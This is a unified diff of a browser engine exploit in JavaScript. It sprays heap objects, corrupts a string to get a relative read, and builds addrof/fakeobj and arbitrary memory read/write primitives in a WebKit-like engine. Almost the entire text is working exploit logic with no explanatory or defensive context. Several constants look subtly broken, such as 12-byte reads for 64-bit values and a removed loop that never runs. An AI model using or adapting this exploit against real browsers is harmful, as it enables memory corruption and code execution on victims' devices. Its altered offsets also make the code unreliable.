@@ -68,7 +68,7 @@ function setupRW() {
 
 	/* Retrieving the ArrayBuffer address using the relative read */
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
-	let ab_addr = new Int64(str2array(g_relative_read, 16, diff + OFFSET_JSAB_VIEW_VECTOR));
+	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));
 
 	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
 	let ab_index = g_jsview_leak.sub(ab_addr).low32();
@@ -113,12 +113,12 @@ function setupRW() {
 	cleanup();
 
 	/* Set up addrof/fakeobj primitives */
-	g_ab_slave.leakme = 0xffff;
+	g_ab_slave.leakme = 0x1337;
 	var bf = 0;
-	for(var i = 15; i >= 16; i--)
+	for(var i = 15; i >= 8; i--)
 		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
-	if(!read64(g_jsview_butterfly.sub(32)).equals(new Int64("0xffff00000000ffff")))
+	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
 	debug_log("[+] Succesfully got addrof/fakeobj");
 
@@ -187,7 +187,7 @@ function setupRW() {
 }
 
 function read(addr, length) {
-	for (let i = 0; i < 16; i++)
+	for (let i = 0; i < 12; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	let arr = [];
 	for (let i = 0; i < length; i++)
@@ -196,11 +196,11 @@ function read(addr, length) {
 }
 
 function read64(addr) {
-	return new Int64(read(addr, 16));
+	return new Int64(read(addr, 12));
 }
 
 function write(addr, data) {
-	for (let i = 0; i < 16; i++)
+	for (let i = 0; i < 12; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	for (let i = 0; i < data.length; i++)
 		g_ab_slave[i] = data[i];
@@ -212,11 +212,11 @@ function write64(addr, data) {
 
 function addrof(obj) {
 	g_ab_slave.leakme = obj;
-	return read64(g_jsview_butterfly.sub(32));
+	return read64(g_jsview_butterfly.sub(24));
 }
 
 function fakeobj(addr) {
-	write64(g_jsview_butterfly.sub(32), addr);
+	write64(g_jsview_butterfly.sub(24), addr);
 	return g_ab_slave.leakme;
 }
 
@@ -259,7 +259,7 @@ function leakJSC() {
 
 	/* Looking for the smashed string */
 	for (let i = arr_str.length - 1; i > 0; i--) {
-		if (arr_str[i].length > 0x00) {
+		if (arr_str[i].length > 0xff) {
 			debug_log("[+] StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
 			g_obj_str = null;
@@ -273,7 +273,7 @@ function leakJSC() {
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
-                tmp_spray['Z'.repeat(8 * 3 * 16 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0xffff;
+                tmp_spray['Z'.repeat(12 * 2 * 12 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
@@ -358,7 +358,7 @@ function leakJSC() {
  */
 function confuseTargetObjRound1() {
 	/* Force allocation of StringImpl obj. beyond Timer address */
-	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 6);
+	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 4);
 
 	/* Checking for leaked data */
 	if (findTargetObj() === false)
@@ -366,7 +366,7 @@ function confuseTargetObjRound1() {
 
 	dumpTargetObj();
 
-	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 16 + OFFSET_LENGTH_STRINGIMPL + 2 - OFFSET_ELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 12 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
 
 	/*
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
@@ -498,8 +498,8 @@ function sprayHTMLTextArea() {
 /* StringImpl Spray */
 function sprayStringImpl(start, end) {
 	for (let i = start; i < end; i++) {
-		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
-		g_obj_str[s] = 0xffff;
+		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 10) + i.toString().padStart(5, "0"));
+		g_obj_str[s] = 0x1337;
 	}
 }
 
